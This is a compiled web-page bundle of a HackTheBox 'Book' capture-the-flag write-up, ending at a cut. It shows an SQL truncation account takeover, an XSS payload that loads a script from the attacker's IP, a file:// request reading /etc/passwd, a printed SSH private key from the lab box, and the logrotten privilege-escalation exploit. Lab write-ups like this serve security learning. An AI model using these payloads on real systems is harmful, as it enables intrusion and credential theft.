"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[8419],{3905:(e,n,t)=>{t.d(n,{Zo:()=>c,kt:()=>h});var a=t(67294);function o(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function i(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function r(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?i(Object(t),!0).forEach((function(n){o(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):i(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function l(e,n){if(null==e)return{};var t,a,o=function(e,n){if(null==e)return{};var t,a,o={},i=Object.keys(e);for(a=0;a<i.length;a++)t=i[a],n.indexOf(t)>=0||(o[t]=e[t]);return o}(e,n);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(a=0;a<i.length;a++)t=i[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(o[t]=e[t])}return o}var p=a.createContext({}),s=function(e){var n=a.useContext(p),t=n;return e&&(t="function"==typeof e?e(n):r(r({},n),e)),t},c=function(e){var n=s(e.components);return a.createElement(p.Provider,{value:n},e.children)},u="mdxType",m={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},d=a.forwardRef((function(e,n){var t=e.components,o=e.mdxType,i=e.originalType,p=e.parentName,c=l(e,["components","mdxType","originalType","parentName"]),u=s(t),d=o,h=u["".concat(p,".").concat(d)]||u[d]||m[d]||i;return t?a.createElement(h,r(r({ref:n},c),{},{components:t})):a.createElement(h,r({ref:n},c))}));function h(e,n){var t=arguments,o=n&&n.mdxType;if("string"==typeof e||o){var i=t.length,r=new Array(i);r[0]=d;var l={};for(var p in n)hasOwnProperty.call(n,p)&&(l[p]=n[p]);l.originalType=e,l[u]="string"==typeof e?e:o,r[1]=l;for(var s=2;s<i;s++)r[s]=t[s];return a.createElement.apply(null,r)}return a.createElement.apply(null,t)}d.displayName="MDXCreateElement"},97635:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>p,contentTitle:()=>r,default:()=>m,frontMatter:()=>i,metadata:()=>l,toc:()=>s});var a=t(87462),o=(t(67294),t(3905));const i={layout:"post",title:"Book ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","pe","exploit","htb","http","ssrf","system","sql"],date:"2020/07/11",thumbnail:"/img/HackTheBox/book.png",toc:!0},r=void 0,l={unversionedId:"HackTheBox/Book/write-up",id:"HackTheBox/Book/write-up",title:"Book ",description:"\ud83d\udca2 Info",source:"@site/writeups/HackTheBox/Book/write-up.md",sourceDirName:"HackTheBox/Book",slug:"/HackTheBox/Book/write-up",permalink:"/writeups/HackTheBox/Book/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"linux",permalink:"/writeups/tags/linux"},{label:"recon",permalink:"/writeups/tags/recon"},{label:"network",permalink:"/writeups/tags/network"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"exploit",permalink:"/writeups/tags/exploit"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"http",permalink:"/writeups/tags/http"},{label:"ssrf",permalink:"/writeups/tags/ssrf"},{label:"system",permalink:"/writeups/tags/system"},{label:"sql",permalink:"/writeups/tags/sql"}],version:"current",frontMatter:{layout:"post",title:"Book ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","pe","exploit","htb","http","ssrf","system","sql"],date:"2020/07/11",thumbnail:"/img/HackTheBox/book.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"Blunder ",permalink:"/writeups/HackTheBox/Blunder/write-up"},next:{title:"Buff ",permalink:"/writeups/HackTheBox/Buff/write-up"}},p={},s=[{value:"\ud83d\udca2 Info",id:"-info",level:2},{value:"Overview",id:"overview",level:3},{value:"Network Enumeration",id:"network-enumeration",level:3},{value:"Web application enumeration and exploitation",id:"web-application-enumeration-and-exploitation",level:3},{value:"Privilege Escalation of Machine",id:"privilege-escalation-of-machine",level:3}],c={toc:s},u="wrapper";function m(e){let{components:n,...i}=e;return(0,o.kt)(u,(0,a.Z)({},c,i,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h2",{id:"-info"},"\ud83d\udca2 Info"),(0,o.kt)("h1",{id:""}),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Name:")," Book"),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Profile:")," ",(0,o.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/230"},"www.hackthebox.eu")),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Difficulty:")," Medium"),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"OS:")," Linux"),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Points:")," 30")),(0,o.kt)("p",null,(0,o.kt)("img",{alt:"book",src:t(64881).Z,width:"598",height:"381"})),(0,o.kt)("h1",{id:"-1"}),(0,o.kt)("h3",{id:"overview"},"Overview"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"TL;DR"),":"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"SQL truncation -> admin accounts"),(0,o.kt)("li",{parentName:"ul"},"SSRF -> XSS -> file disclosure"),(0,o.kt)("li",{parentName:"ul"},"logrotten: logrotate race condition pe")),(0,o.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ sudo pacman -S nmap   dirsearch pspy\n")),(0,o.kt)("h3",{id:"network-enumeration"},"Network Enumeration"),(0,o.kt)("p",null,"As usual we can launch a full ",(0,o.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap")," scan ",(0,o.kt)("inlineCode",{parentName:"p"},"nmap -A -oA nmap_full 10.10.10.176"),":"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"# Nmap 7.80 scan initiated Thu Mar 26 23:50:58 2020 as: nmap -A -oA nmap_full 10.10.10.176\nNmap scan report for 10.10.10.176\nHost is up (0.031s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)\n|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)\n|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n| http-cookie-flags:\n|   /:\n|     PHPSESSID:\n|_      httponly flag not set\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: LIBRARY - Read | Learn | Have Fun\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=3/26%OT=22%CT=1%CU=39363%PV=Y%DS=2%DC=T%G=Y%TM=5E7D31E\nOS:7%P=x86_64-unknown-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=\nOS:A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M5\nOS:4DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE8\nOS:8)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S\nOS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=\nOS:)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%\nOS:A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%\nOS:DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=\nOS:40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 993/tcp)\nHOP RTT      ADDRESS\n1   30.66 ms 10.10.14.1\n2   30.79 ms 10.10.10.176\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Thu Mar 26 23:51:19 2020 -- 1 IP address (1 host up) scanned in 20.68 seconds\n")),(0,o.kt)("p",null,"Only port 22 and 80, so we must start by attacking a web application."),(0,o.kt)("h3",{id:"web-application-enumeration-and-exploitation"},"Web application enumeration and exploitation"),(0,o.kt)("p",null,"Let's start at ",(0,o.kt)("a",{parentName:"p",href:"http://10.10.10.176/"},"http://10.10.10.176/")),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/kCLppog.png",alt:null})),(0,o.kt)("p",null,"We can create an account and login."),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/NiFOCZz.jpg",alt:null})),(0,o.kt)("p",null,"At ",(0,o.kt)("a",{parentName:"p",href:"http://10.10.10.176/contact.php"},"http://10.10.10.176/contact.php")," there is form sending a message to\n",(0,o.kt)("inlineCode",{parentName:"p"},"admin@book.htb"),"."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-html"},'<form action="" method="POST" name="myForm" onsubmit="return validateForm()">\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-javascript"},'  if (document.location.search.match(/type=embed/gi)) {\n    window.parent.postMessage("resize", "*");\n  }\nfunction validateForm() {\n  var x = document.forms["myForm"]["name"].value;\n  var y = document.forms["myForm"]["email"].value;\n  if (x == "") {\n    alert("Please fill name field. Should not be more than 10 characters");\n    return false;\n  }\n  if (y == "") {\n    alert("Please fill email field. Should not be more than 20 characters");\n    return false;\n  }\n}\n')),(0,o.kt)("p",null,"So the size of the fields are limited to:"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"name <= 10"),(0,o.kt)("li",{parentName:"ul"},"email <= 20")),(0,o.kt)("p",null,"If they put a limit client-side there is maybe a limitation server-side too.\nWe can try a SQL truncation."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ irb\nirb(main):001:0> 'admin@book.htb'.size\n=> 14\nirb(main):002:0> 'admin@book.htb' + ' ' * 6 + 'cyfun'\n=> \"admin@book.htb      cyfun\"\n")),(0,o.kt)("p",null,"The size of the mail address of the admin is 14, so by adding 6 whitespaces we\nwill reach 20 and we will begin to truncate. Let's try to send this:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"POST /index.php HTTP/1.1\nHost: book.htb\n...\nCookie: PHPSESSID=6cn5fv2fpmmfec6tjkvr1v3sto\nUpgrade-Insecure-Requests: 1\n\nname=cyfunadmin&email=admin@book.htb      cyfun&password=cyfun\n")),(0,o.kt)("p",null,"The server will look if the email ",(0,o.kt)("inlineCode",{parentName:"p"},"admin@book.htb      cyfun")," already exists,\nof course it's not, so when creating our account the MySQL database will\nwill cut whatever is appended after 20 chars and remove spaces, so it will\nend by updating the password of the already existing ",(0,o.kt)("inlineCode",{parentName:"p"},"admin@book.htb"),"."),(0,o.kt)("p",null,"We can find the admin login page ",(0,o.kt)("a",{parentName:"p",href:"http://10.10.10.176/admin/index.php"},"http://10.10.10.176/admin/index.php"),"\nwith ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/maurosoria/dirsearch"},"dirsearch"),":"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ dirsearch -u http://10.10.10.176/ -e php\n\n _|. _ _  _  _  _ _|_    v0.3.9\n(_||| _) (/_(_|| (_| )\n\nExtensions: php | HTTP method: get | Threads: 10 | Wordlist size: 6046\n\nError Log: /home/cyfun/.dirsearch/logs/errors-20-04-19_17-38-41.log\n\nTarget: http://10.10.10.176/\n\n[17:38:42] Starting:\n...\n[17:38:45] 301 -  312B  - /admin  ->  http://10.10.10.176/admin/\n[17:38:46] 200 -    6KB - /admin/\n[17:38:46] 403 -  277B  - /admin/.htaccess\n[17:38:46] 200 -    6KB - /admin/?/login\n[17:38:46] 302 -    0B  - /admin/home.php  ->  index.php\n[17:38:46] 200 -    6KB - /admin/index.php\n[17:38:52] 301 -  311B  - /docs  ->  http://10.10.10.176/docs/\n[17:38:52] 403 -  277B  - /docs/\n[17:38:53] 302 -    0B  - /home.php  ->  index.php\n[17:38:54] 301 -  313B  - /images  ->  http://10.10.10.176/images/\n[17:38:54] 200 -    7KB - /index.php\n[17:38:54] 200 -    7KB - /index.php/login/\n[17:38:59] 403 -  277B  - /server-status\n[17:38:59] 403 -  277B  - /server-status/\n[17:38:59] 302 -    0B  - /settings.php  ->  index.php\n")),(0,o.kt)("p",null,"So we can login as the administrator."),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/u0K9U7i.png",alt:null})),(0,o.kt)("p",null,"On the ",(0,o.kt)("em",{parentName:"p"},"Collections")," page ",(0,o.kt)("a",{parentName:"p",href:"http://book.htb/admin/collections.php"},"http://book.htb/admin/collections.php")," we can download\na PDF all the users or all the books that seems dynamically generated."),(0,o.kt)("p",null,"Note: we can't exploit the XSS in the name because it is limited to 10 chars."),(0,o.kt)("p",null,"Also in the user interface there is a ",(0,o.kt)("em",{parentName:"p"},"Collections")," page ",(0,o.kt)("a",{parentName:"p",href:"http://book.htb/collections.php"},"http://book.htb/collections.php"),"\nwhere any user can submit a new book."),(0,o.kt)("p",null,"So we could probably inject a XSS payload in the book title, that will be\nembedded in the dynamically generated book collection PDF so we execute\nJavaScript code in the context of the backend (maybe a bot or script using\nphantom.js)."),(0,o.kt)("p",null,"So we just have to use a simple XSS payload to server our local script."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-html"},'<script src="http://10.10.15.117:8000/cyfun.js"><\/script>\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ python -m http.server --bind 10.10.15.117\n")),(0,o.kt)("p",null,"With the code execution we can try to do a SSRF (Server Side Request Forgery)\nwith a XRH (XMLHttpRequest).\nWe can then make requests with the ",(0,o.kt)("inlineCode",{parentName:"p"},"file://")," pseudo-protocol to read local\nfiles."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-javascript"},'xhr=new XMLHttpRequest;\nxhr.onload=function(){ document.write(btoa(this.responseText)) };\nxhr.open("GET", "file:///etc/passwd");\nxhr.send();\n')),(0,o.kt)("p",null,"It takes several minutes before our book is added to the collection so we can\nmonitor at the search page (searching by author) when it is added\n",(0,o.kt)("a",{parentName:"p",href:"http://book.htb/search.php"},"http://book.htb/search.php"),"."),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/UGfcYUX.png",alt:null})),(0,o.kt)("p",null,"Then you have to be quick after the book was added to generate the PDF to trigger\nthe XSS because the user book are removed very often.\n",(0,o.kt)("a",{parentName:"p",href:"http://book.htb/admin/collections.php?type=collections"},"http://book.htb/admin/collections.php?type=collections")),(0,o.kt)("p",null,"Then the PDF contains the base64 encoded string corresponding to the file we asked for."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kL25ldGlmOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQvcmVzb2x2ZTovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDI6MTA2OjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDc6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpfYXB0Ong6MTA0OjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KbHhkOng6MTA1OjY1NTM0OjovdmFyL2xpYi9seGQvOi9iaW4vZmFsc2UKdXVpZGQ6eDoxMDY6MTEwOjovcnVuL3V1aWRkOi91c3Ivc2Jpbi9ub2xvZ2luCmRuc21hc3E6eDoxMDc6NjU1MzQ6ZG5zbWFzcSwsLDovdmFyL2xpYi9taXNjOi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwODoxMTI6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMDk6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTEwOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4KcmVhZGVyOng6MTAwMDoxMDAwOnJlYWRlcjovaG9tZS9yZWFkZXI6L2Jpbi9iYXNoCm15c3FsOng6MTExOjExNDpNeVNRTCBTZXJ2ZXIsLCw6L25vbmV4aXN0ZW50Oi9iaW4vZmFsc2UK\n")),(0,o.kt)("p",null,"Note: I opened the PDF with libreoffice as when I opened it with Okular as it is\nall in one line the text was truncated."),(0,o.kt)("p",null,"Then we can decode the text like this ",(0,o.kt)("inlineCode",{parentName:"p"},"printf %s 'base64 here' | base64 -d")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"/etc/passwd")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin\nsyslog:x:102:106::/home/syslog:/usr/sbin/nologin\nmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin\n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\nlxd:x:105:65534::/var/lib/lxd/:/bin/false\nuuidd:x:106:110::/run/uuidd:/usr/sbin/nologin\ndnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\nlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:109:1::/var/cache/pollinate:/bin/false\nsshd:x:110:65534::/run/sshd:/usr/sbin/nologin\nreader:x:1000:1000:reader:/home/reader:/bin/bash\nmysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false\n")),(0,o.kt)("p",null,"We can see there is a ",(0,o.kt)("em",{parentName:"p"},"reader")," user, let's try to investigate is home directory\n",(0,o.kt)("inlineCode",{parentName:"p"},"/home/reader"),"."),(0,o.kt)("p",null,"I found ",(0,o.kt)("inlineCode",{parentName:"p"},"/home/reader/.ssh/id_rsa"),"."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"-----BEGIN RSA PRIVATE KEY-----\nMIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ\nG8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0\nWxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0\nePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s\n7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK\n75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7\n3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+\nMcKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI\ntIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ\njhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz\n7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6\nGZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL\nE2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/\nciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+\nSRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l\nskGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V\no5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m\nHc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC\nhBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u\nPb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh\nsMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf\ntdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi\n5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW\ny1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN\nnkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4=\n-----END RSA PRIVATE KEY-----\n")),(0,o.kt)("p",null,"Let's fix the rights so openssh won't complain: ",(0,o.kt)("inlineCode",{parentName:"p"},"chmod 400 id_rsa"),".\nThen we can connect via ssh as ",(0,o.kt)("em",{parentName:"p"},"reader")," using the private key."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ ssh reader@10.10.10.176 -i id_rsa\n")),(0,o.kt)("p",null,"At this point we can read ",(0,o.kt)("inlineCode",{parentName:"p"},"user.txt"),"."),(0,o.kt)("h3",{id:"privilege-escalation-of-machine"},"Privilege Escalation of Machine"),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://github.com/DominicBreuker/pspy"},"pspy")," allows us too see process of other users or that doesn't live very long."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"...\n2020/04/19 19:43:17 CMD: UID=0    PID=41530  | /usr/sbin/logrotate -f /root/log.cfg \n2020/04/19 19:43:17 CMD: UID=0    PID=41529  | /bin/sh /root/log.sh \n2020/04/19 19:43:17 CMD: UID=0    PID=41531  | sleep 5 \n2020/04/19 19:43:20 CMD: UID=0    PID=41534  | /bin/sh /root/log.sh \n2020/04/19 19:43:20 CMD: UID=0    PID=41533  | /lib/systemd/systemd-udevd \n2020/04/19 19:43:20 CMD: UID=0    PID=41532  | /bin/sh /root/log.sh \n")),(0,o.kt)("p",null,"It seems there is a logrotate task running as root."),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation"},"https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation")),(0,o.kt)("p",null,"So we will able to exploit a vulnerability named ",(0,o.kt)("em",{parentName:"p"},"logrotten"),", by writing in a\nfile rotated by logrorate we will be able to write a file in any location."),(0,o.kt)("p",null,"Since there is a ",(0,o.kt)("inlineCode",{parentName:"p"},"backup")," folder right under our nose and an ",(0,o.kt)("inlineCode",{parentName:"p"},"access.log")," file\nwe can write into that seems to be rotated, let's assume we can exploit this\nvulnerability."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"reader@book:~$ ls -lh backups/\ntotal 4.0K\n-rw-r--r-- 1 reader reader  0 Jan 29 13:05 access.log\n-rw-r--r-- 1 reader reader 91 Jan 29 13:05 access.log.1\n")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://github.com/whotwagner/logrotten"},"https://github.com/whotwagner/logrotten")),(0,o.kt)("p",null,"We can download and compile the exploit, then prepare our payload file."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ gcc -o logrotten logrotten.c\n")),(0,o.kt)("p",null,"We can fill the file to force the rotation and execute the exploit:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'$ ./logrotten -p daolyap /home/reader/backups/access.log\n$ echo "test" > access.log\n')),(0,o.kt)("p",null,"Since it's a race condition it may need several execution before working."),(0,o.kt)("p",null,"The log file and our payload file will be written into\n",(0,o.kt)("inlineCode",{parentName:"p"},"/etc/bash_completition.d/")," so next time root will log in it will execute our\npayload (maybe a cron task)."),(0,o.kt)("p",null,"Full paper: 